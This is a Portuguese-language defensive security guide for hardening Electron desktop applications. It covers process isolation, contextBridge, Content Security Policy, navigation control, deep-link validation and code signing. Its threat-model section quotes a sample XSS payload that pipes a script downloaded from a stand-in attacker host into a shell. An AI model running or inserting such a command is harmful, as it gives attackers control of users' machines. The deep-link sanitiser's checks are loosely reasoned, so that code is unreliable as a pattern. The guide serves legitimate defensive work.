# 🛡️ Guia de Segurança Defensiva Desktop: Electron Zero-Trust

<div align="center">

[![Padrão](https://img.shields.io/badge/Security-Chromium%20Sandbox%20%7C%20Zero--Trust-DC2626?style=for-the-badge)](../../README.md)
[![OWASP](https://img.shields.io/badge/Standards-OWASP%20Desktop%20%7C%20CWE--94%20Mitigation-10B981?style=for-the-badge)](../../README.md)
[![Compliance](https://img.shields.io/badge/Compliance-Code%20Signing%20%7C%20ASAR%20Integrity-6366F1?style=for-the-badge)](../../README.md)

<p align="center">
  <b>Diretrizes obrigatórias de segurança defensiva, isolamento de processos, prevenção de Remote Code Execution (RCE), Content Security Policy e proteção de deep links para Electron.</b>
</p>

</div>

---

## 📚 Sumário Executivo

1. **O Modelo de Ameaça Desktop: Por que XSS se Transforma em RCE**
2. **A Tríade Zero-Trust Inviolável (`nodeIntegration`, `contextIsolation`, `sandbox`)**
3. **Ponte Segura via `contextBridge` e Sanitização de Tipos**
4. **Política de Segurança de Conteúdo (CSP) Estrita**
5. **Banimento Definitivo da Tag `<webview>`**
6. **Controle Rígido de Navegação (`will-navigate` e `setWindowOpenHandler`)**
7. **Mitigação de Ataques via Deep Links e Argument Injection**
8. **Integridade de Empacotamento ASAR e Code Signing**

---

## 1. O Modelo de Ameaça Desktop: De XSS a RCE

Na Web tradicional, um ataque de **Cross-Site Scripting (XSS)** permite que o atacante roube cookies de sessão ou manipule o DOM da aba. No **Electron**, se a aplicação for mal configurada, a camada de renderização tem acesso a módulos Node.js como `child_process` e `fs`.

> [!CAUTION]
> Se `nodeIntegration` estiver habilitado ou o isolamento for quebrado, um único script malicioso injetado via XSS pode invocar:
> ```javascript
> require('child_process').execSync('curl -s https://atacante.com/malware.sh | sh');
> ```
> Isso concede controle total sobre o sistema operacional da máquina do usuário (**Remote Code Execution - RCE**).

Por essa razão, o Electron deve ser operado sob o paradigma **Zero-Trust**: a camada de UI (Renderer) é considerada **zona não confiável**.

---

## 2. A Tríade Zero-Trust Inviolável

Toda instância de `BrowserWindow` criada na aplicação deve conter explicitamente as seguintes diretivas:

```typescript
// src/main/window.ts
import { BrowserWindow } from 'electron';
import path from 'path';

export function createSecureWindow(): BrowserWindow {
  return new BrowserWindow({
    webPreferences: {
      // 1. OBRIGATÓRIO: Proíbe terminantemente require() e process na UI
      nodeIntegration: false,
      // 2. OBRIGATÓRIO: Separa o protótipo do JS da página do JS do preload
      contextIsolation: true,
      // 3. OBRIGATÓRIO: Ativa a sandbox no nível do sistema operacional do Chromium
      sandbox: true,
      // 4. Bloqueia o uso de Webview tag
      webviewTag: false,
      // 5. Especifica a única ponte autorizada
      preload: path.join(__dirname, '../preload/index.js')
    }
  });
}
```

---

## 3. Ponte Segura via `contextBridge`

O script `preload.js` atua como o único canal de passagem. Nunca exponha o módulo `ipcRenderer` inteiro ou métodos crus:

```typescript
// ❌ TERMINANTEMENTE PROIBIDO: Abre brecha de bypass no isolamento
contextBridge.exposeInMainWorld('electron', {
  send: (channel: string, data: any) => ipcRenderer.send(channel, data),
  on: (channel: string, fn: Function) => ipcRenderer.on(channel, fn)
});

// ✅ CORRETO E SEGURO: Mapeamento determinístico com validação de payload
contextBridge.exposeInMainWorld('desktopAPI', {
  downloadFile: (url: string): Promise<{ path: string }> => {
    // Sanitização local no preload antes de invocar o processo pai
    if (!url.startsWith('https://empresa.com/')) {
      return Promise.reject(new Error('Origem de download não autorizada.'));
    }
    return ipcRenderer.invoke('fs:download', url);
  }
});
```

---

## 4. Política de Segurança de Conteúdo (CSP) Estrita

Toda janela HTML deve declarar um CSP rigoroso através de tag `<meta>` ou cabeçalho HTTP:

```html
<meta 
  http-equiv="Content-Security-Policy" 
  content="default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.empresa.com; base-uri 'none'; form-action 'none';"
>
```

### Regras do CSP:
- Proibido `unsafe-eval` (bloqueia ataques baseados em injeção de código em runtime).
- Proibido carregar scripts externos de CDNs de terceiros (todo código executável deve estar empacotado localmente no bundle).

---

## 5. Banimento Definitivo da Tag `<webview>`

A tag `<webview>` é obsoleta e propensa a brechas de escape de sandbox.
- Não utilize `<webview>`. Se precisar exibir conteúdo web de terceiros, utilize `WebContentsView` (Electron moderno) com controle total de limites e eventos no Main Process.

---

## 6. Controle Rígido de Navegação

Aplicações desktop não devem permitir que o usuário ou links externos naveguem a janela principal para fora da aplicação:

```typescript
// src/main/security-handlers.ts
import { BrowserWindow, shell } from 'electron';

export function enforceNavigationSecurity(window: BrowserWindow): void {
  // 1. Bloqueia navegação da própria janela para URLs externas
  window.webContents.on('will-navigate', (event, navigationUrl) => {
    const parsedUrl = new URL(navigationUrl);
    const isLocalApp = parsedUrl.protocol === 'file:' || navigationUrl.startsWith('http://localhost:');

    if (!isLocalApp) {
      event.preventDefault(); // Impede que o app carregue o site externo no lugar da UI
      shell.openExternal(navigationUrl); // Abre de forma segura no navegador padrão do SO
    }
  });

  // 2. Bloqueia window.open() e target="_blank" desautorizados
  window.webContents.setWindowOpenHandler(({ url }) => {
    if (url.startsWith('https://')) {
      shell.openExternal(url);
    }
    return { action: 'deny' }; // Nega abertura de novas janelas pelo Chromium
  });
}
```

---

## 7. Mitigação de Ataques via Deep Links e Argument Injection

Registrar esquemas de URL customizados (ex: `meuapp://`) expõe o aplicativo a ataques onde navegadores ou outros aplicativos tentam disparar argumentos de linha de comando arbitrários:

```typescript
// src/main/deep-link.ts
import { app } from 'electron';

export function sanitizeDeepLink(rawUrl: string): { action: string; token?: string } | null {
  try {
    const url = new URL(rawUrl);
    
    // Valida protocolo esperado
    if (url.protocol !== 'meuapp:') {
      return null;
    }

    // Previne Argument Injection: rejeita URLs contendo flags de linha de comando
    if (rawUrl.includes('--') || rawUrl.includes('/')) {
      const pathname = url.hostname; // meuapp://auth -> hostname = 'auth'
      if (!['auth', 'open-document'].includes(pathname)) {
        return null;
      }
    }

    return {
      action: url.hostname,
      token: url.searchParams.get('token') || undefined
    };
  } catch {
    return null; // URL malformada descartada
  }
}
```

---

## 8. Integridade de Empacotamento ASAR e Code Signing

### 8.1 Assinatura Criptográfica Obrigatória (Code Signing)
Distribuir aplicativos desktop sem assinatura válida é inaceitável em ambiente corporativo:
- **macOS:** Requer certificado Apple Developer ID Application e notarização via Apple Notary Service (`xcrun notarytool submit`). Sem notarização, o Gatekeeper impede a execução inicial.
- **Windows:** Requer certificado de assinatura de código EV (Extended Validation) para garantir reputação no Windows Defender SmartScreen.

### 8.2 Proteção de Integridade do Arquivo ASAR
O Electron empacota o código fonte em arquivos `.asar`. Em builds de produção:
- Habilite `asar: true` e `asarUnpack` estrito apenas para binários `.node` nativos.
- Utilize a flag `CSC_IDENTITY_AUTO_DISCOVERY=true` no CI/CD para assinar cada binário filho dentro do `.app` ou `.exe`.
